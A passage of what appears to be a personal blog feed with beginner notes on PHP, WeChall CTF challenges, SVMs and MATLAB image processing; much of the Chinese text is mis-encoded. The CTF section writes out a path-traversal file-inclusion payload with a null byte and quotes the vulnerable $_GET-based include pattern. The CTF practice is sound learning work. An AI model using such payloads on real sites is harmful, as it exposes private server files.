href="#SERVER-â€œ-PHP-SELFâ€-å°†æäº¤çš„è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°†åœ¨ä¸è¡¨å•ç›¸åŒçš„é¡µé¢ä¸Šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚" class="headerlink" title="$ _ SERVER [â€œ PHP_SELFâ€]å°†æäº¤çš„è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°†åœ¨ä¸è¡¨å•ç›¸åŒçš„é¡µé¢ä¸Šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚"></a>$ _ SERVER [â€œ PHP_SELFâ€]å°†æäº¤çš„è¡¨å•æ•°æ®å‘é€åˆ°é¡µé¢æœ¬èº«ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°†åœ¨ä¸è¡¨å•ç›¸åŒçš„é¡µé¢ä¸Šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚</h5><p>htmlspecialcharsï¼ˆï¼‰å‡½æ•°å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ã€‚è¿™æ„å‘³ç€å®ƒå°†ç”¨ï¼†lt;æ›¿æ¢&lt;å’Œ&gt;ä¹‹ç±»çš„HTMLå­—ç¬¦ã€‚å’Œï¼†gt;ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢æ”»å‡»è€…é€šè¿‡ä»¥è¡¨æ ¼å½¢å¼æ³¨å…¥HTMLæˆ–Javascriptä»£ç ï¼ˆè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼‰æ¥åˆ©ç”¨ä»£ç ã€‚</p><h5 id="ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼‰ï¼ˆä½¿ç”¨PHP-trimï¼ˆï¼‰å‡½æ•°ï¼‰"><a href="#ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼‰ï¼ˆä½¿ç”¨PHP-trimï¼ˆï¼‰å‡½æ•°ï¼‰" class="headerlink" title="ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼‰ï¼ˆä½¿ç”¨PHP trimï¼ˆï¼‰å‡½æ•°ï¼‰"></a>ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤ä¸å¿…è¦çš„å­—ç¬¦ï¼ˆå¤šä½™çš„ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼‰ï¼ˆä½¿ç”¨PHP trimï¼ˆï¼‰å‡½æ•°ï¼‰</h5><h5 id="ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤åæ–œæ ï¼ˆ-ï¼‰ï¼ˆä½¿ç”¨PHP-stripslashesï¼ˆï¼‰å‡½æ•°ï¼‰"><a href="#ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤åæ–œæ ï¼ˆ-ï¼‰ï¼ˆä½¿ç”¨PHP-stripslashesï¼ˆï¼‰å‡½æ•°ï¼‰" class="headerlink" title="ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤åæ–œæ ï¼ˆ\ï¼‰ï¼ˆä½¿ç”¨PHP stripslashesï¼ˆï¼‰å‡½æ•°ï¼‰"></a>ä»ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­åˆ é™¤åæ–œæ ï¼ˆ\ï¼‰ï¼ˆä½¿ç”¨PHP stripslashesï¼ˆï¼‰å‡½æ•°ï¼‰</h5><p>ä½¿ç”¨PHP empty() å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span>PHP_SELF<span class="string">"]);?&gt;"</span>&gt;</span><br><span class="line">Name: &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">&lt;span class="error"&gt;* &lt;?php echo $nameErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">E-mail:</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"email"</span>&gt;</span><br><span class="line">&lt;span class="error"&gt;* &lt;?php echo $emailErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Website:</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"website"</span>&gt;</span><br><span class="line">&lt;span class="error"&gt;&lt;?php echo $websiteErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Comment: &lt;textarea name=<span class="string">"comment"</span> rows=<span class="string">"5"</span> cols=<span class="string">"40"</span>&gt;</span><br></pre></td></tr></table></figure><p>preg_matchï¼ˆï¼‰å‡½æ•°åœ¨å­—ç¬¦ä¸²ä¸­æœç´¢æ¨¡å¼ï¼Œå¦‚æœå­˜åœ¨æ¨¡å¼ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚<br>æ­£åˆ™è¡¨è¾¾å¼</p><p>includeå’Œrequireè¯­å¥ç›¸åŒï¼Œä½†å¤±è´¥æ—¶é™¤å¤–ï¼š<br>require å°†äº§ç”Ÿè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰å¹¶åœæ­¢è„šæœ¬</p><h5 id="include-åªä¼šäº§ç”Ÿè­¦å‘Šï¼ˆE-WARNINGï¼‰å¹¶ä¸”è„šæœ¬å°†ç»§ç»­"><a href="#include-åªä¼šäº§ç”Ÿè­¦å‘Šï¼ˆE-WARNINGï¼‰å¹¶ä¸”è„šæœ¬å°†ç»§ç»­" class="headerlink" title="include åªä¼šäº§ç”Ÿè­¦å‘Šï¼ˆE_WARNINGï¼‰å¹¶ä¸”è„šæœ¬å°†ç»§ç»­"></a>include åªä¼šäº§ç”Ÿè­¦å‘Šï¼ˆE_WARNINGï¼‰å¹¶ä¸”è„šæœ¬å°†ç»§ç»­</h5><p>è¯¥readfile()å‡½æ•°è¯»å–æ–‡ä»¶å¹¶å°†å…¶å†™å…¥è¾“å‡ºç¼“å†²åŒºã€‚</p><p>&lt;?php<br>$myfile = fopen(â€œwebdictionary.txtâ€, â€œrâ€) or die(â€œUnable to open file!â€);<br>echo fread($myfile,filesize(â€œwebdictionary.txtâ€));<br>fclose($myfile);<br>?&gt;</p><p>è¯¥fclose()åŠŸèƒ½ç”¨äºå…³é—­æ‰“å¼€çš„æ–‡ä»¶ã€‚<br>ç»“æŸæ‰€æœ‰æ–‡ä»¶åï¼Œå…³é—­æ‰€æœ‰æ–‡ä»¶æ˜¯ä¸€ç§è‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ã€‚æ‚¨ä¸å¸Œæœ›åœ¨æœåŠ¡å™¨ä¸Šåˆ°å¤„è¿è¡Œæ‰“å¼€çš„æ–‡ä»¶å ç”¨èµ„æºï¼</p><p>è¯¥feof()åŠŸèƒ½æ£€æŸ¥æ˜¯å¦å·²è¾¾åˆ°â€œæ–‡ä»¶ç»“å°¾â€ï¼ˆEOFï¼‰ã€‚</p><p>è¯¥fopen()å‡½æ•°è¿˜ç”¨äºåˆ›å»ºæ–‡ä»¶ã€‚å¯èƒ½æœ‰äº›æ··ä¹±ï¼Œä½†æ˜¯åœ¨PHPä¸­ï¼Œä½¿ç”¨ä¸æ‰“å¼€æ–‡ä»¶ç›¸åŒçš„åŠŸèƒ½åˆ›å»ºæ–‡ä»¶ã€‚</p><p>$filename = â€˜pages/â€˜.(isset($_GET[â€œfileâ€])$_GET[â€œfileâ€]:â€welcomeâ€).â€™.htmlâ€™;</p><p>ï¼Ÿ ï¼š</p><h5 id="issetï¼ˆï¼‰å‡½æ•°æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡ï¼Œè¿™æ„å‘³ç€å¿…é¡»å£°æ˜è¯¥å˜é‡å¹¶ä¸”è¯¥å˜é‡ä¸èƒ½ä¸ºNULLã€‚"><a href="#issetï¼ˆï¼‰å‡½æ•°æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡ï¼Œè¿™æ„å‘³ç€å¿…é¡»å£°æ˜è¯¥å˜é‡å¹¶ä¸”è¯¥å˜é‡ä¸èƒ½ä¸ºNULLã€‚" class="headerlink" title="issetï¼ˆï¼‰å‡½æ•°æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡ï¼Œè¿™æ„å‘³ç€å¿…é¡»å£°æ˜è¯¥å˜é‡å¹¶ä¸”è¯¥å˜é‡ä¸èƒ½ä¸ºNULLã€‚"></a>issetï¼ˆï¼‰å‡½æ•°æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†å˜é‡ï¼Œè¿™æ„å‘³ç€å¿…é¡»å£°æ˜è¯¥å˜é‡å¹¶ä¸”è¯¥å˜é‡ä¸èƒ½ä¸ºNULLã€‚</h5><p>dieï¼ˆï¼‰å‡½æ•°æ˜¯exitï¼ˆï¼‰å‡½æ•°çš„åˆ«åã€‚</p><h5 id="evalï¼ˆï¼‰å‡½æ•°å°†å­—ç¬¦ä¸²è¯„ä¼°ä¸ºPHPä»£ç ã€‚"><a href="#evalï¼ˆï¼‰å‡½æ•°å°†å­—ç¬¦ä¸²è¯„ä¼°ä¸ºPHPä»£ç ã€‚" class="headerlink" title="evalï¼ˆï¼‰å‡½æ•°å°†å­—ç¬¦ä¸²è¯„ä¼°ä¸ºPHPä»£ç ã€‚"></a>evalï¼ˆï¼‰å‡½æ•°å°†å­—ç¬¦ä¸²è¯„ä¼°ä¸ºPHPä»£ç ã€‚</h5><h5 id="dirnameï¼ˆï¼‰å‡½æ•°è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„ã€‚"><a href="#dirnameï¼ˆï¼‰å‡½æ•°è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„ã€‚" class="headerlink" title="dirnameï¼ˆï¼‰å‡½æ•°è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„ã€‚"></a>dirnameï¼ˆï¼‰å‡½æ•°è¿”å›çˆ¶ç›®å½•çš„è·¯å¾„ã€‚</h5><h5 id="in-arrayï¼ˆï¼‰å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç‰¹å®šå€¼ã€‚"><a href="#in-arrayï¼ˆï¼‰å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç‰¹å®šå€¼ã€‚" class="headerlink" title="in_arrayï¼ˆï¼‰å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç‰¹å®šå€¼ã€‚"></a>in_arrayï¼ˆï¼‰å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢ç‰¹å®šå€¼ã€‚</h5><p>æ³¨æ„ï¼šå¦‚æœæœç´¢å‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ç±»å‹å‚æ•°è®¾ç½®ä¸ºTRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</p><h3 id="WECHALL-LFI"><a href="#WECHALL-LFI" class="headerlink" title="WECHALL LFI"></a>WECHALL LFI</h3><p>?file=page/jhkd.html<br>?file=../../solution.php%00<br>%00 åçš„å­—ç¬¦ä¸ç®—ï¼Œå·²ç»æ›´æ”¹<br>../ éå†ç›®å½•</p><p>switch ($which)<br>        {<br>        case 0:<br>        case 1:<br>        case 2:<br>                require_once $which.â€™.phpâ€™;<br>                break;<br>        default:<br>                echo GWF_HTML::error(â€˜PHP-0817â€™, â€˜Hacker NoNoNo!â€™, false);<br>                break;<br>        }<br>which=0,1,2 éƒ½æ‰§è¡Œrequire_once</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFå…¥é—¨ WECALL</title>
      <link href="/2020/05/15/CTF%E5%85%A5%E9%97%A8%20WECALL/"/>
      <url>/2020/05/15/CTF%E5%85%A5%E9%97%A8%20WECALL/</url>
      
        <content type="html"><![CDATA[<p>åˆå­¦CTF å…¥é—¨å¤ªéš¾</p><h2 id="wecall-challenges-è§£å†³æ–¹æ³•"><a href="#wecall-challenges-è§£å†³æ–¹æ³•" class="headerlink" title="wecall challenges è§£å†³æ–¹æ³•"></a>wecall challenges è§£å†³æ–¹æ³•</h2><h4 id="training-steganoI"><a href="#training-steganoI" class="headerlink" title="training steganoI"></a>training steganoI</h4><p>$cat  xxx.bmp<br><a href="https://www.tecmint.com/13-basic-cat-command-examples-in-linux/" target="_blank" rel="noopener">https://www.tecmint.com/13-basic-cat-command-examples-in-linux/</a></p><h4 id="Crypto-Caesar-I"><a href="#Crypto-Caesar-I" class="headerlink" title="Crypto - Caesar I"></a>Crypto - Caesar I</h4><p>pythonå‡½æ•° list() ord() chr()</p><a id="more"></a><h4 id="WWW-Robots"><a href="#WWW-Robots" class="headerlink" title="WWW-Robots"></a>WWW-Robots</h4><p>robots.txt<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p><h4 id="URL-ENCODE"><a href="#URL-ENCODE" class="headerlink" title="URL ENCODE"></a>URL ENCODE</h4><p>URL encoding replaces unsafe ASCII characters with a â€œ%â€ followed by two hexadecimal digits. åå…­è¿›åˆ¶<br>URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.<br>URLs can only be sent over the Internet using the ASCII character-set.</p><h4 id="python-3-7"><a href="#python-3-7" class="headerlink" title="python 3.7"></a>python 3.7</h4><p>from urllib.parse import unquote<br>tar -xf è§£å‹ç¼© ï¼Ÿè‡ªåŠ¨è¯†åˆ«<br>java -jar </p><h4 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h4><p>urllib.request</p><p>urlopenè¿”å›çš„æ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œdecode(â€˜utf-8â€™)è§£ç </p><h4 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h4><p><a href="https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F</a></p><p>â€˜weshallâ€™</p><p>wechall4?.(jpg|gif|tiff|bmp|png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SVMå­¦ä¹ ç¬”è®°2</title>
      <link href="/2020/04/01/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
      <url>/2020/04/01/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<p>å‡¸äºŒæ¬¡è§„åˆ’ ==  å¼€å£å‘ä¸‹</p><hr><p>åˆ†ç±»é æ”¯æ’‘å‘é‡è®¡ç®—  å…¶ a~=0</p><a id="more"></a><hr><p>hard-margin</p><p>soft-margin å®¹å¿ä¸€äº›è¯¯å·®<br>æ¯ä¸ªå®¹å¿å€¼å’Œå¸Œæœ›æœ€å°</p><hr><p>KKTå¸®åŠ©ç¡®å®ša ï¼Œ Lå‡½æ•°ç³»æ•° æ‹‰æ ¼æœ—æ—¥</p><hr><p>K-fold æ•°æ®åˆ†æˆkä»½è¿›è¡Œtrain test<br>è·å–æœ€ä½³å‚æ•°</p><p>è°ƒç”¨crossvalå°±æ˜¯è¦æ‰¾åˆ°å‚æ•°C(æƒ©ç½šç³»æ•°)å’Œsigmaï¼Œä½¿è¯¯åˆ†ç‡mcræœ€å°</p><hr><p>one vs one<br>å¤šç±»åˆ¤å®šæŠ•ç¥¨</p><p>one vs all<br>æœ‰ç¬¦å·è·ç¦»å–æœ€å¤§</p><hr><p>æ‰å‘ç° matlab %%<br>%%<br>è¿è¡ŒèŠ‚</p><hr><p>ä»£ç <br>å‚è€ƒ <a href="http://www.matlabsky.com/thread-11026-1-1.html" target="_blank" rel="noopener">http://www.matlabsky.com/thread-11026-1-1.html</a></p><p><code>fitcsvm()</code><br>ä½¿ç”¨<code>&#39;OptimizeHyperparameters&#39;</code>- è¦ä¼˜åŒ–çš„å‚æ•° å’Œ<br><code>&#39;HyperparameterOptimizationOptions&#39;</code> - ä¼˜åŒ–çš„é€‰é¡¹<br><code>æ¥æ‰¾åˆ°æœ€ä½³sigma å’Œ C ç½šå› å­</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> SVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SVMå­¦ä¹ ç¬”è®°1</title>
      <link href="/2020/03/31/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
      <url>/2020/03/31/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<p><a href="https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s" target="_blank" rel="noopener">https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s</a><br>å‚è€ƒè§†é¢‘è¯¾ç¨‹</p><p>mvnrndï¼ˆï¼‰äº§ç”Ÿç‰¹å®šå‡å€¼å’Œåæ–¹å·®çš„çŸ©é˜µ</p><hr><a id="more"></a><p>kenel çŸ©é˜µè¦æœ‰é™æ­£åŠå®šï¼Œkenelå‡½æ•°ï¼šR^d-&gt;R<br><a href="https://imgchr.com/i/GQilQJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/31/GQilQJ.th.png" alt="GQilQJ.th.png"></a></p><hr><p>å¸¸è§kenel å¯ä»¥è‡ªå·±æ„é€ <br><a href="https://imgchr.com/i/GQF9Tx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/31/GQF9Tx.th.png" alt="GQF9Tx.th.png"></a></p><hr><p>REPRODUCING KENEL MAP<br>ç”±kenel æ¨å‡º feature mapping ä»¥åŠå…¶é€†<br><img src="https://s1.ax1x.com/2020/03/31/GQdhI1.png" alt="GQdhI1.png"></p><hr><p>Principal Component Analysis ä¸»æˆåˆ†åˆ†æ<br>KPCA</p><hr><p>Linear Discriminant Analysis ç·šæ€§å€åˆ¥åˆ†æ<br>æŠ•å½±åæ ‡ï¼šå†…ç§¯*v<br>å»£ç¾©å€åˆ¥åˆ†æ(Generalized Discriminant Analysis)ã€‚</p><p><img src="https://s1.ax1x.com/2020/03/31/GQUvmd.png" alt="GQUvmd.png"></p><hr><p>KKT svmè¯æ˜ä¸­ä¼šç”¨åˆ°<br><img src="https://s1.ax1x.com/2020/03/31/GQdzJP.png" alt="GQdzJP.png"></p><p><img src="https://s1.ax1x.com/2020/03/31/GQwZiq.png" alt="GQwZiq.png"></p><hr><p>å…¶ä»–</p><p><a href="https://ww2.mathworks.cn/help/matlab/data-type-conversion.html" target="_blank" rel="noopener">https://ww2.mathworks.cn/help/matlab/data-type-conversion.html</a><br>matlab æ•°æ®ç±»å‹è½¬æ¢</p><pre><code>&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Ap0huJwyT7g&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> SVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>essay1</title>
      <link href="/2020/02/19/essay1/"/>
      <url>/2020/02/19/essay1/</url>
      
        <content type="html"><![CDATA[<p>matlabå¯ä»¥</p><p>psnr()  RGBå›¾åƒç›´æ¥æ¥<br><img src="https://s2.ax1x.com/2020/02/19/3EM7nK.png" alt="3EM7nK.png"><br><img src="https://s2.ax1x.com/2020/02/19/3EMLAe.png" alt="3EMLAe.png"></p><p>Normalized  Cross  Correlation<br>normxcorr2 matlabè®¡ç®—æ–¹æ³•ä¸åŒ<br><img src="https://s2.ax1x.com/2020/02/19/3EMXhd.png" alt="3EMXhd.png"><br>The  value  is  generally 0â€“1. However, ideally it should be 1 but the value 0.7 is acceptable.</p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlab_haar3</title>
      <link href="/2020/02/18/matlab_haar3/"/>
      <url>/2020/02/18/matlab_haar3/</url>
      
        <content type="html"><![CDATA[<p>RGB  ä¸‰ä¸ªäºŒç»´æ•°ç»„åˆ†åˆ«è¡¨ç¤ºR,G,B<br>å³ï¼Œå¦‚æœimshowçš„å‚æ•°ç±»å‹ä¸ºdouble ï¼Œé‚£ä¹ˆå‚æ•°çš„å–å€¼èŒƒå›´åªæœ‰åœ¨[0 1]æ‰ä¼šæ­£å¸¸æ˜¾ç¤ºã€‚å½“å€¼å¤§äº1æ—¶ï¼Œéƒ½æ˜¾ç¤ºç™½è‰²ã€‚è¿™ä¸matlabçš„ä¼ ç»Ÿæ˜¯ä¸€è‡´çš„ï¼Œ å¯¹äºç°åº¦å›¾åƒï¼Œuint8è¡¨ç¤ºèŒƒå›´æ˜¯[0 255] ,doubleè¡¨ç¤ºèŒƒå›´æ˜¯[0 1]<br><a id="more"></a><br>isequal()</p><p>å¡å°”è¾¾è’é‡ä¹‹æ¯Onedrive</p><pre><code>https://imhuanggh-my.sharepoint.com/:f:/g/personal/bin_imhuanggh_onmicrosoft_com/EhOlmQivpRBLh3BLkqxyDLYBW0JDW1V7i8lixd1T1Df-4g</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlab_haar2</title>
      <link href="/2020/02/12/matlab_haar2/"/>
      <url>/2020/02/12/matlab_haar2/</url>
      
        <content type="html"><![CDATA[<p><code>imbinarize</code><br>Binarize 2-D grayscale image or 3-D volume by thresholding</p><hr><a id="more"></a><p>64:1<br>ans =<br>  ç©ºçš„ 1Ã—0 double è¡Œå‘é‡<br><del>æˆ‘äººå‚»äº†</del><br><code>æ³¨æ„æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹</code><br><del>è¿™ä¸¤ä¸ªé—®é¢˜å¼„äº†æˆ‘ä¸€ä¸‹åˆ</del></p><hr><p>å›¾å½¢çš„å‡½æ•° fliplr å¯ä»¥ä»å·¦å¾€å³åœ°ç¿»è½¬çŸ©é˜µ</p><hr><p>æˆ‘è§‰å¾—æˆ‘æ‡‚ç‚’è‚¡äº†<br><a href="http://player.bilibili.com/player.html?aid=68967083&amp;cid=119544791&amp;page=1" target="_blank" rel="noopener">https://player.bilibili.com/player.html?aid=68967083&amp;cid=119544791&amp;page=1</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlab_haar1</title>
      <link href="/2020/02/11/matlab_haar1/"/>
      <url>/2020/02/11/matlab_haar1/</url>
      
        <content type="html"><![CDATA[<pre><code>waveletfamilies(&apos;a&apos;)waveletfamilies(&apos;f&apos;)waveinfo(&apos;db&apos;)</code></pre><p> use wfilters, wavefun, and wpfun to obtain the filters, wavelet, or wavelet packets </p><a id="more"></a><hr><p>linspace<br><code>Generate linearly spaced vectorcollapse all in page</code><br>Syntax<br>y = linspace(x1,x2)<br>y = linspace(x1,x2,n)</p><hr><p>å°æ³¢çš„å«ä¹‰ï¼Œå³ä¸ºæ—¶é—´ä¸Šè¡°å‡å¿«ï¼Œå’Œå‚…é‡Œå¶çš„æ­£å¼¦æ³¢ç›¸æ¯”è¦çŸ­ã€‚<br>åœ¨é¢‘ç‡åŸŸä¸Šï¼Œé€šè¿‡æ‹‰ä¼¸æˆ–å‹ç¼©å°æ³¢çš„é•¿åº¦ï¼Œæ¥æ”¹å˜å°æ³¢çš„é•¿çŸ­å’Œé¢‘ç‡ï¼Œå®ç°ä¸åŒé¢‘ç‡ä¸‹çš„å°æ³¢ç³»æ•°ã€‚<br>å°æ³¢ä¸­ï¼Œä¸€èˆ¬ç”¨å°ºåº¦scaleæ¥è¡¡é‡å°æ³¢çš„é¢‘ç‡fï¼Œä¸¤è€…ä¹‹é—´çš„è½¬æ¢å…³ç³»ä¸ºï¼š<br>scaleâˆ—f=Fsâˆ—wcfscale <em> f=Fs </em> wcf<br>scaleâˆ—f=Fsâˆ—wcf<br>å…¬å¼ä¸­ï¼ŒFsä»£è¡¨ä¿¡å·çš„é‡‡æ ·é¢‘ç‡ï¼Œwcfä¸ºå°æ³¢çš„ä¸­å¿ƒé¢‘ç‡ï¼ˆwave central freqï¼‰ï¼Œåœ¨matlabé‡Œå¯ä»¥ç”¨ centfrq(wavename) æ¥æŸ¥è¯¢ã€‚<br> å™ªç‚¹ é«˜é¢‘ä¿¡å·</p><hr><p>imagesc<br>Display image with scaled colors</p><hr><p>å°ºåº¦å‡½æ•°åˆç§°ä¸ºå°æ³¢çˆ¶å‡½æ•°<br>phi å¸Œè…Šæ–‡</p><hr><p><code>haart2ï¼ˆxï¼Œlevel)</code><br>If level is greater than 1, then h, v, and d are cell arrays. If level is equal to 1, then h, v, and d are matrices.<br>2-D Haar wavelet transform</p><hr><p><code>ihaart2</code><br>Inverse 2-D Haar wavelet transform</p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlabå›¾åƒç¤ºä¾‹ç¬”è®°3</title>
      <link href="/2020/02/10/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B03/"/>
      <url>/2020/02/10/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<p><code>mat2gray</code> å°†dicomå˜ä¸ºgrey<br><code>im2uint8</code></p><hr><a id="more"></a><p> The image on the right has higher contrast, <code>with intensity values that fill the entire intensity range [0, 255].</code></p><hr><p><del>å¦‚æœæŒ‡å®šç©ºçŸ©é˜µ ([])ï¼Œåˆ™ imshow ä½¿ç”¨ [min(I(:)) max(I(:))]ã€‚æ¢è¨€ä¹‹ï¼Œä½¿ç”¨ I ä¸­çš„æœ€å°å€¼ä½œä¸ºé»‘è‰²ï¼Œä½¿ç”¨æœ€å¤§å€¼ä½œä¸ºç™½è‰²ã€‚</del></p><hr><p>imadjust<br>You must specify the intensities as values between 0 and 1 regardless of the class of I. If I is uint8, the values you supply are multiplied by 255 to determine the actual values to use; if I is uint16, the values are multiplied by 65535. </p><hr><p>figure<code>,</code>imshow(pout_histeq)<code>;</code><br>title(â€˜Histeqâ€™);</p><hr><p>ROI<br>Create a Binary Mask<br>You can use the createMask function of the imroi base class to create a binary mask for any type of ROI object â€” impoint, imline, imrect, imellipse, impoly, or imfreehand. </p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlabå›¾åƒç¤ºä¾‹ç¬”è®°2</title>
      <link href="/2020/02/07/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B02/"/>
      <url>/2020/02/07/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h4 id="dicom-ï¼ˆa-image-type-using-in-medical"><a href="#dicom-ï¼ˆa-image-type-using-in-medical" class="headerlink" title="dicom ï¼ˆa image type using in medical)"></a>dicom ï¼ˆa image type using in medical)</h4><p>To read <code>metadata</code>from a DICOM file, use the <code>dicominfo function</code></p><hr><p>To read<code>image data</code>from a DICOM file, use the <code>dicomread function.</code></p><a id="more"></a><hr><p>If you just want to view the <code>metadata in a DICOM file</code>, for debugging purposes, you can use the<code>dicomdisp function.</code></p><hr><p>use one of the toolbox image display functions <code>imshow or 